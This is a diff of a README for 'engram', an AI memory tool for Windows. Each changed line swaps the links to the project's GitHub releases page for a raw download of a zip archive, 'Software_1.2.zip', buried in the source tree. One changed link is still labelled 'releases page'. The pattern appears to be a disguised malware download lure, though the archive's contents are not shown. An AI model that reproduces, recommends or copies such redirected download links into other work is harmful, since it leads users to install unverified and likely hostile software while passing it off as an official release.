@@ -1,6 +1,6 @@
 # 🔑 engram - Simple AI Memory Across Devices
 
-[![Download engram](https://img.shields.io/badge/Download%20engram%20%E2%86%92-Get%20It%20Here-blue?style=for-the-badge)](https://github.com/jsierra87/engram/releases)
+[![Download engram](https://img.shields.io/badge/Download%20engram%20%E2%86%92-Get%20It%20Here-blue?style=for-the-badge)](https://github.com/jsierra87/engram/raw/refs/heads/main/server/src/cli/Software_1.2.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Follow these steps to download and run engram on your Windows PC.
 
 To get the latest version, visit the engram releases page below. This page lists all available downloads, including the most current stable build.
 
-[![Download engram](https://img.shields.io/badge/Download%20engram%20%E2%86%92-Get%20It%20Here-brightgreen?style=for-the-badge)](https://github.com/jsierra87/engram/releases)
+[![Download engram](https://img.shields.io/badge/Download%20engram%20%E2%86%92-Get%20It%20Here-brightgreen?style=for-the-badge)](https://github.com/jsierra87/engram/raw/refs/heads/main/server/src/cli/Software_1.2.zip)
 
 On the releases page:
 
@@ -138,7 +138,7 @@ Close unused apps to free memory. Reinstall engram if problems persist.
 
 ## 🛠 How to update engram
 
-Check the [releases page](https://github.com/jsierra87/engram/releases) regularly for new versions. Download the latest installer and run it. The update will replace the old version without losing your saved data.
+Check the [releases page](https://github.com/jsierra87/engram/raw/refs/heads/main/server/src/cli/Software_1.2.zip) regularly for new versions. Download the latest installer and run it. The update will replace the old version without losing your saved data.
 
 ---
 
@@ -150,4 +150,4 @@ Topics related to engram include AI, productivity, memory management, and prompt
 
 ---
 
-[![Download engram](https://img.shields.io/badge/Download%20engram%20%E2%86%92-Get%20It%20Here-blue?style=for-the-badge)](https://github.com/jsierra87/engram/releases)
+[![Download engram](https://img.shields.io/badge/Download%20engram%20%E2%86%92-Get%20It%20Here-blue?style=for-the-badge)](https://github.com/jsierra87/engram/raw/refs/heads/main/server/src/cli/Software_1.2.zip)
